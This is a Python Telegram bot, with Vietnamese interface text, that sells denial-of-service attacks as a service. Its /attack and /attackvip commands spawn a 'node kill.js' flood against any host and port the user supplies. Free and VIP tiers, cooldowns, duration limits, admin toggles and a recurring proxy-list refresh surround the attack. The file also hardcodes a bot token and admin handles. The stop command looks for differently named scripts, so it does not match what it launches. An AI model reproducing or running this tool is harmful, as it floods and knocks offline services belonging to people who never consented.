import telebot
import subprocess
import time
from threading import Thread
import json
import os
import psutil

BOT_TOKEN = "8232458883:AAFDt-PiFQcRl56wKomvRsztSJjcbVFPVpA"
bot = telebot.TeleBot(BOT_TOKEN)

VIP_FILE = "vip_users.json"
admin_ids = {5976243149, 7929379903}

proxy_updating = False
proxy_loop_started = False
vip_usage = {}
free_global_tracker = {"count": 0, "last": 0}

current_attackers = set()
bot_active = True

# Quản lý bật/tắt bot (admin-only)
@bot.message_handler(commands=['offbot'])
def off_bot(message):
    if message.from_user.id not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
    global bot_active
    bot_active = False
    bot.send_message(message.chat.id, "🔒 Bot đã bị khoá không cho phép tấn công.")

@bot.message_handler(commands=['onbot'])
def on_bot(message):
    if message.from_user.id not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
    global bot_active
    bot_active = True
    bot.send_message(message.chat.id, "🔓 Bot đã được mở khoá và có thể tấn công.")

def load_vip_users():
    if os.path.exists(VIP_FILE):
        with open(VIP_FILE, 'r') as f:
            return set(json.load(f))
    return set()

def save_vip_users():
    with open(VIP_FILE, 'w') as f:
        json.dump(list(whitelist_users), f)

whitelist_users = load_vip_users()

def is_on_cooldown(user_id):
    now = time.time()
    if user_id in whitelist_users:
        usage = vip_usage.get(user_id, {"count": 0, "last": 0})
        if usage["count"] >= 2 and now - usage["last"] < 20:
            return True, int(20 - (now - usage["last"]))
        elif now - usage["last"] >= 20:
            vip_usage[user_id] = {"count": 1, "last": now}
        else:
            vip_usage[user_id] = {"count": usage["count"] + 1, "last": now}
        return False, None
    else:
        global free_global_tracker
        if free_global_tracker["count"] >= 2 and now - free_global_tracker["last"] < 60:
            return True, int(60 - (now - free_global_tracker["last"]))
        elif now - free_global_tracker["last"] >= 60:
            free_global_tracker = {"count": 1, "last": now}
        else:
            free_global_tracker["count"] += 1
            free_global_tracker["last"] = now
        return False, None

def delayed_notify(user_id, host, duration):
    time.sleep(duration)
    bot.send_message(user_id, f"✅ Tấn công đã kết thúc: {host} ({duration}s)")

def send_intro(chat_id):
    try:
        bot.send_video(chat_id, open("banner.mp4", 'rb'))
    except Exception as e:
        print("Không gửi được video banner:", e)

def start_proxy_scan():
    global proxy_scan_end_time
    proxy_scan_end_time = time.time() + 300

def is_in_proxy_cooldown():
    return time.time() < proxy_scan_end_time

def is_proxy_running():
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        if proc.info['cmdline'] and 'proxy.py' in proc.info['cmdline']:
            return True
    return False

proxy_scan_end_time = 0

@bot.message_handler(commands=['.ddos'])
def start(message):
    send_intro(message.chat.id)
    bot.send_message(message.chat.id,
        "🤖 BOT ĐANG SẴN SÀNG .\n"
        "🚀 /attack <host> <port> <time>\n"
        "🚀 /attackvip <host> <port> <time>\n"
        "🏆 /plan <kiểm tra vip>\n"
        "🗞️ /id <lấy id>\n"
        "👑 /admin <danh sách admin>\n"
        "🌐 /update <update proxy>\n"
        "🛑 /stopattack <dừng tấn công>\n\n"
        "👑 MENU ADMIN\n"
        "👑 /add <id>\n👑 /kick <id>\n"
        "🔒 /offbot - 🔓 /onbot")

@bot.message_handler(commands=['plan'])
def check_plan(message):
    send_intro(message.chat.id)
    uid = message.chat.id
    if uid in whitelist_users:
        bot.send_message(uid, "🌟 Bạn là VIP.")
    else:
        bot.send_message(uid, "🔒 Bạn là FREE.")

@bot.message_handler(commands=['id'])
def get_id(message):
    send_intro(message.chat.id)
    if message.reply_to_message:
        uid = message.reply_to_message.from_user.id
        name = message.reply_to_message.from_user.first_name
        bot.send_message(message.chat.id, f"🌐 ID của {name} là: {uid}")
    else:
        bot.send_message(message.chat.id, f"🌐 ID của bạn: {message.from_user.id}")

@bot.message_handler(commands=['admin'])
def admin_info(message):
    send_intro(message.chat.id)
    bot.send_message(message.chat.id, "👑 Bot Dev: user revelation\n☎️ @qkdzvcl206\n\n👑 admin 2: user \n☎️@Imissyou16")

@bot.message_handler(commands=['add'])
def add_user(message):
    send_intro(message.chat.id)
    if message.from_user.id not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        return bot.send_message(message.chat.id, "❗ /add <user_id>")
    uid = int(args[1])
    whitelist_users.add(uid)
    save_vip_users()
    bot.send_message(message.chat.id, f"✅ Đã thêm {uid} vào VIP")

@bot.message_handler(commands=['kick'])
def kick_user(message):
    send_intro(message.chat.id)
    if message.from_user.id not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        return bot.send_message(message.chat.id, "❗ /kick <user_id>")
    uid = int(args[1])
    if uid in whitelist_users:
        whitelist_users.remove(uid)
        save_vip_users()
        bot.send_message(message.chat.id, f"❌ Đã xoá {uid} khỏi VIP")
    else:
        bot.send_message(message.chat.id, f"❓ {uid} không có trong danh sách VIP")

@bot.message_handler(commands=['update'])
def update(message):
    global proxy_updating, proxy_loop_started
    send_intro(message.chat.id)
    uid = message.from_user.id

    if uid not in whitelist_users and uid not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Chỉ VIP/admin được dùng.")

    cooldown, wait = is_on_cooldown(uid)
    if cooldown:
        return bot.send_message(message.chat.id, f"⏳ Chờ {wait}s")

    if proxy_updating:
        bot.send_message(message.chat.id, "⚠️ Proxy đang cập nhật, nhưng vẫn sẽ chạy lại ngay.")
    else:
        bot.send_message(message.chat.id, "🔁 Đang cập nhật proxy (và sẽ lặp mỗi 2 tiếng).")

    start_proxy_scan()

    def run_proxy_now():
        global proxy_updating
        proxy_updating = True
        subprocess.call(["python3", "proxy.py"])
        proxy_updating = False

    Thread(target=run_proxy_now, daemon=True).start()

    if not proxy_loop_started:
        proxy_loop_started = True
        def proxy_auto_loop():
            while True:
                time.sleep(7200)
                subprocess.call(["python3", "proxy.py"])

        Thread(target=proxy_auto_loop, daemon=True).start()

@bot.message_handler(commands=['attack'])
def attack_free(message):
    if not bot_active:
        return bot.send_message(message.chat.id, "🔒 Bot đang bị khoá bởi admin.")

    if is_in_proxy_cooldown():
        return bot.send_message(message.chat.id, "⚠️ Proxy đang được cập nhật, hãy thử lại sau 300 giây.")

    uid = message.from_user.id
    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /attack <host> <port> <time>")

    host, port, duration = args[1], int(args[2]), int(args[3])

    if duration > 200:
        return bot.send_message(message.chat.id, "❌ FREE chỉ được 200s")

    cooldown, wait = is_on_cooldown(uid)
    if cooldown:
        return bot.send_message(message.chat.id, f"⏳ Chờ {wait}s")

    cmd = ["node", "kill.js", host, str(duration), "40", "5", "all.txt", "bypass"]
    now = time.strftime("%H:%M:%S %d-%m-%Y")

    msg = (
        f"✅ Tấn công FREE đã bắt đầu\n"
        f"🌐 Host: {host}\n"
        f"🔌 Port: {port}\n"
        f"⏰ Time: {duration}s\n"
        f"🛠️ Method: FREE\n"
        f"🏆 Plan: FREE\n\n"
        f"💬 Trạng thái: Hoạt động\n"
        f"💕 Bot sẵng sàng phục vụ\n"
        f"🕒 Thời gian: {now}"
    )
    bot.send_message(message.chat.id, msg)

    Thread(target=lambda: subprocess.Popen(cmd)).start()
    Thread(target=delayed_notify, args=(uid, host, duration)).start()
    current_attackers.add(uid)

@bot.message_handler(commands=['attackvip'])
def attack_vip(message):
    if not bot_active:
        return bot.send_message(message.chat.id, "🔒 Bot đang bị khoá bởi admin.")

    if is_proxy_running():
        return bot.send_message(message.chat.id, "🚫 Proxy đang được cập nhật. Không thể dùng lúc này.")

    uid = message.from_user.id
    if uid not in whitelist_users and uid not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền dùng lệnh này (chỉ dành cho VIP)")

    args = message.text.split()
    if len(args) != 4:
        return bot.send_message(message.chat.id, "❗ /attackvip <host> <port> <time>")

    host, port, duration = args[1], args[2], int(args[3])

    if duration > 1000:
        return bot.send_message(message.chat.id, "❌ VIP chỉ được tối đa 1000s")

    cooldown, wait = is_on_cooldown(uid)
    if cooldown:
        return bot.send_message(message.chat.id, f"⏳ Chờ {wait}s")

    cmd = ["node", "kill.js", "GET", host, str(duration), "45", "70", "all.txt",
           "--query", "1", "--delay", "1", "--full", "--http", "mix",
           "--bfm", "true", "--referer", "rand", "--randrate"]

    now = time.strftime("%H:%M:%S %d-%m-%Y")

    msg = (
        f"✅ Tấn công VIP đã bắt đầu\n"
        f"🌐 Host: {host}\n"
        f"🔌 Port: {port}\n"
        f"⏰ Time: {duration}s\n"
        f"🛠️ Method: VIP\n"
        f"🏆 Plan: VIP\n\n"
        f"💬 Trạng thái: Hoạt động\n"
        f"💕 Bot sẵng sàng phục vụ\n"
        f"🕒 Thời gian: {now}"
    )

    send_intro(message.chat.id)
    bot.send_message(message.chat.id, msg)

    Thread(target=lambda: subprocess.Popen(cmd)).start()
    Thread(target=delayed_notify, args=(uid, host, duration)).start()
    current_attackers.add(uid)

@bot.message_handler(commands=['stopattack'])
def stop_attack(message):
    uid = message.from_user.id

    if uid not in current_attackers and uid not in admin_ids:
        return bot.send_message(message.chat.id, "❌ Bạn không có quyền dừng cuộc tấn công.")

    stopped = 0
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['cmdline'] and 'node' in proc.info['name']:
                cmdline_str = ' '.join(proc.info['cmdline'])
                if 'vip.js' in cmdline_str or 'free.js' in cmdline_str:
                    proc.kill()
                    stopped += 1
        except Exception:
            continue

    current_attackers.discard(uid)

    if stopped == 0:
        bot.send_message(message.chat.id, "⚠️ Không có tiến trình tấn công nào đang chạy.")
    else:
        bot.send_message(message.chat.id, f"🛑 Đã dừng {stopped} tiến trình tấn công.")

print("🤖 Bot đã chạy.")
bot.polling()
